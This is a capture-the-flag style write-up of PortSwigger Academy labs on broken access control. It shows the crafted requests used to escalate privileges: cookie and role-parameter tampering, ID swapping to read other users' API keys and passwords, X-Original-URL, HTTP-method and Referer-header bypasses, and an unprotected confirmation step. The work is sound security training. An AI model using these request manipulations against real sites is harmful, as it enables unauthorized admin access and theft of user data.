# Access Control Vulnerabilities (Labs: PortSwigger Academy)

`Broken Authentication`: When a user access resources or perform actions that they are not supposed to be able to.

### Labs from PortSwigger Academy

🟩🟩 APPRENTICE 🟩🟩

#### Lab 1: Unprotected admin functionality

```
visiting /robots.txt give 
Disallow: /administrator-panel

we can simply visit the url and delete the user carlos 
```

#### Lab 2: Unprotected admin functionality with unpredictable URL

```
Visiting page source leaks admin panel url 
```

#### Lab 3: User role controlled by request parameter

```
Each request hash cookie
Cookie: session=sDBAEXHgc<snip>mYoXfa9M9pb; Admin=false

we can simply edit Admin value to true in each request to get administrative access
```

#### Lab 4: User role can be modified in user profile

```
while updating email of the account we get following as response

request: 
{"email":"test@gmail.com"}

response:
{
  "username": "wiener",
  "email": "test@gmail.com",
  "apikey": "9kAv<snip>ZVRIlZJ79",
  "roleid": 1
}

now, we can add roleid field in change-email request

request:
{
	"email":"test@gmail.com",
	"roleid":2
}

response:
{
  "username": "wiener",
  "email": "test@gmail.com",
  "apikey": "9kAvthjfqQN77Hvd0UVNVt4ZVRIlZJ79",
  "roleid": 2
}


We now have roleid = 2 and this role has administrator privilege

```

#### Lab 5: User ID controlled by request parameter

This lab has a horizontal privilege escalation vulnerability on the user account page. To solve the lab, obtain the API key for the user `carlos` and submit it as the solution. You can log in to your own account using the following credentials: `wiener:peter`

```
GET /my-account?id=wiener

this request gives us the api key.
we can simply change the id parameter to carlos to get its api key

GET /my-account?id=carlos
```

#### Lab 6: User ID controlled by request parameter, with unpredictable user IDs

This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs. To solve the lab, find the GUID for `carlos`, then submit his API key as the solution. You can log in to your own account using the following credentials: `wiener:peter`

```
visiting the my-account reveals the api key

request:
GET /my-account?id=ff71b393-2fba-4165-b060-ff6d659ab629

same as before but this time need GUID.

if we visit the webapp we can see various posts. Each post has mention of the author.
one of the post was written by carols, from this we get the GUID of user carlos

using this guid we can read the API key of carlos
```

#### Lab 7: User ID controlled by request parameter with data leakage in redirect

This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response. To solve the lab, obtain the API key for the user `carlos` and submit it as the solution. You can log in to your own account using the following credentials: `wiener:peter`

```
request:
GET /my-account?id=wiener

reveals the api key.

we can change the id param to carlos
GET /my-account?id=carlos

this time it redirects us to homepage. During the redirection, it has a body containing the api key belongings to carlos.
```

#### Lab 8: User ID controlled by request parameter with password disclosure

This lab has user account page that contains the current user's existing password, prefilled in a masked input. To solve the lab, retrieve the administrator's password, then use it to delete the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`

```
GET /my-account?id=wiener

reveals the password of user wiener

changing the id parm to administrator lets us view the password of administrator
```

#### Lab 9: Insecure direct object references

This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs. Solve the lab by finding the password for the user `carlos`, and logging into their account.

```
GET /download-transcript/2.txt
we can download the chat history using above request.

changing the filename to 1.txt gives us the chat history of other user.
GET /download-transcript/1.txt
```

🟦🟦 PRACTITIONER LABS 🟦🟦

#### Lab 10: URL-based access control can be circumvented

This website has an unauthenticated admin panel at `/admin`, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the `X-Original-URL` header.

To solve the lab, access the admin panel and delete the user `carlos`.

```
Visiting the /admin gives 403 Forbidden

we can visit /admin by adding header the request 

request:
GET / HTTP/2
X-Original-Url: /admin

After having access to /admin, we find request to delete carlos is /admin/delete/?username=carlos


carlos can be deleted as
request:

GET /?username=carlos HTTP/2
X-Original-Url: /admin/delete/
```

Why it works (brief)

* The front-end or proxy blocks direct requests to `/admin` by inspecting the request URL and returning `403`.
* However, the backend framework determines routing based on the `X-Original-URL` header (used by some reverse proxies and internal routers).
* When you send a request like: `GET /?username=carlos X-Original-URL: /admin/delete/`
* the proxy accepts it (because the visible path is `/`) and forwards it to the backend.
* The backend then reads `X-Original-URL` for routing and the query string (`?username=carlos`) from the real URL, combining them into an internal request to `/admin/delete/?username=carlos`.
* This lets you reach and trigger the admin delete function even though `/admin` is blocked externally.

#### Lab 11: Method-based access control can be circumvented

This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

```
logging in as adminstrator we found a endpoint to upgrade user power.

request:
POST /admin-roles
username=carlos&action=upgrade

this request can only be made my admin user.

but changing the method to PUT, we can make the request using any user.

request: (as non admin user)
POST /admin-roles
username=wiener&action=upgrade

response: (401 Unauthorized)


request: (as non admin user)
PUT /admin-roles
username=wiener&action=upgrade

response:
302 --> 200 OK
```

#### Lab 12: Multi-step process with no access control on one step

This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

```
account upgrade process consist of 2 requests

request 1:
POST /admin-roles
username=wiener&action=upgrade

request 2:
POST /admin-roles
action=upgrade&confirmed=true&username=wiener

for any normal user, proper access control rule is placed on 1st request.
but 2nd request lacks the access control, which means we can can perform admin action in the 2nd request to make ourself admin
```

#### Lab 13: Referer-based access control

This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

```
requests to promote user to admin:
GET /admin-roles?username=wiener&action=upgrade

this request can be sent only with 
Referer: site/admin


Hence, as normal user, we can set the referer header as site/admin and perform the requets to make ourself admin
```
